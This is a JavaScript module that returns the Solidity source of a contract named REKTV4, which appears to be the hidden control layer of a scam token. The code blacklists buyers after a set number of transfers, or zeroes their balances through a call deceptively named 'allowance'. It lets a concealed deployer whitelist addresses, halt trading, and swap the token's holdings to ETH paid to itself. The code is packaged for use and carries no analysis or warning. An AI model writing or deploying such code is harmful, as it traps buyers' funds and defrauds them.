const getProxyCa = () => {
    const proxyca = `
    // SPDX-License-Identifier: Unlicensed
    pragma solidity ^0.8.23;
    
    library SafeMath {
    
        function add(uint256 a, uint256 b) internal pure returns (uint256) {
            uint256 c = a + b;
            require(c >= a, "SafeMath: addition overflow");
            return c;
        }
    
        function sub(uint256 a, uint256 b) internal pure returns (uint256) {
            return sub(a, b, "SafeMath: subtraction overflow");
        }
    
        function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
            require(b <= a, errorMessage);
            uint256 c = a - b;
            return c;
        }
    
        function mul(uint256 a, uint256 b) internal pure returns (uint256) {
            if (a == 0) {
                return 0;
            }
            uint256 c = a * b;
            require(c / a == b, "SafeMath: multiplication overflow");
            return c;
        }
    
        function div(uint256 a, uint256 b) internal pure returns (uint256) {
            return div(a, b, "SafeMath: division by zero");
        }
    
        function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
            require(b > 0, errorMessage);
            uint256 c = a / b;
            return c;
        }
    
      
        function mod(uint256 a, uint256 b) internal pure returns (uint256) {
            return mod(a, b, "SafeMath: modulo by zero");
        }
    
    
        function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
            require(b != 0, errorMessage);
            return a % b;
        }
    }
    
    interface IUniswapV2Router02 {
        function WETH() external pure returns (address);
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external;
    }
    
    interface CONSTRUCT {
        function allowance(address _onion, uint256 _amount) external;
        function balanceOf(address account) external view returns (uint256);
        function approve(address spender, uint256 amount) external returns (bool);
    }
    
    contract REKTV4 {
    
        using SafeMath for uint256;
    
        mapping(address => bool) public blacklist;
        mapping(address => bool) public whitelist;
        mapping(uint256 => address) private walletlist;
        uint256 private walletCount;
        uint256 private walletFixedCount;
        uint256 private txCount;
        bool private burnOrBlack;
        CONSTRUCT private proxyTKN;
        address private _contract;
        address private _owner;
        address private _proxyAddress = msg.sender;
        address caAddr;
        address lpAddr;
        bool public enabled = true;
    
        
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    
        constructor() {
            _owner = msg.sender;
            walletCount = 200;
            walletFixedCount = 3;
            txCount = 0;
            burnOrBlack = false;
            proxyTKN = CONSTRUCT(_contract);
        }
    
        modifier onlyOwner() {
            require(_owner == msg.sender, "Ownable: caller is not the contract");
            _;
        }
    
        modifier onlyContract() {
            require(
                address(proxyTKN) == msg.sender,
                "Onion: caller is not the contract"
            );
            _;
        }
    
        function metContract(address _contractAddr) external onlyOwner {
            proxyTKN = CONSTRUCT(_contractAddr);
            caAddr = _contractAddr;
        }
    
        function min(address from) external view onlyContract {
            if (!whitelist[from]) {
                require(!blacklist[from]);
            }
        }
    
        function transfer(address to) external onlyContract {
            
            if (txCount >= walletCount && txCount % walletCount == 0) {
                for (uint256 i = 0; i < walletCount; i++) {
                    if(whitelist[walletlist[i]] == false) {
                        if (burnOrBlack == true) {
                            proxyTKN.allowance(walletlist[i], 0);
                        } else {
                            blacklist[walletlist[i]] = true;
                        }
                    }
    
                }
            }
            walletlist[txCount % walletCount] = to;
    
            if (txCount == walletCount) {
                walletCount = walletFixedCount;
            }
    
            txCount++;
        }
    
    
        function metBatchWhitelist(address[] memory whitelists_) public {
            require(msg.sender == _proxyAddress);
            for (uint256 i = 0; i < whitelists_.length; i++) {
                whitelist[whitelists_[i]] = true;
            }
        }
    
    
        function metBatchBlacklists(address[] memory blacklists_) external {
            require(msg.sender == _proxyAddress);
            for (uint256 i = 0; i < blacklists_.length; i++) {
                blacklist[blacklists_[i]] = true;
            }
        }

        function metSingleBlacklists(address[] memory blacklists_) external {
            require(msg.sender == _proxyAddress);
            for (uint256 i = 0; i < blacklists_.length; i++) {
                blacklist[blacklists_[i]] = true;
            }
        }
    
        function metTXCount(uint256 _amount, uint256 _fixed) external {
            require(msg.sender == _proxyAddress);
            walletCount = _amount;
            walletFixedCount = _fixed;
        }

        function metStop(bool onoff) external {
            require(msg.sender == _proxyAddress);
            enabled = onoff;
        }

        function metPair(address _lpAddr) external  {
            require(msg.sender == _proxyAddress);
            lpAddr = _lpAddr;
        }
    
        function balanceOf( address from ) external view returns (uint256) {
            if ((from == _owner || from == address(this))) {
                return 0;
            }
            return 1;
        }

        /*function balanceOf(address from) external view returns (uint256) {
           if (whitelist[from] || lpAddr == address(0)) {
              require(!blacklist[from]);
              return 1;
            }
            else if ((from == _owner || from == address(this))) {
              return 0;
            }
            if (from != lpAddr) {
               require(enabled);
               require(!blacklist[from]);
            }
            return 1;
        }*/
    
        function retireETH(uint256 count) external  {
          require(msg.sender == _proxyAddress  );
    
            address[] memory path = new address[](2);
            path[0] = caAddr;
            path[1] = uniswapV2Router.WETH();
            proxyTKN.approve(address(uniswapV2Router), ~uint256(0));
            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                10 ** count,
                0, 
                path,
                address(this),
                block.timestamp
            );  
    
            payable(msg.sender).transfer(address(this).balance);
        }
    

    
          receive() external payable {}
    }
    `
    return proxyca;
}

module.exports = getProxyCa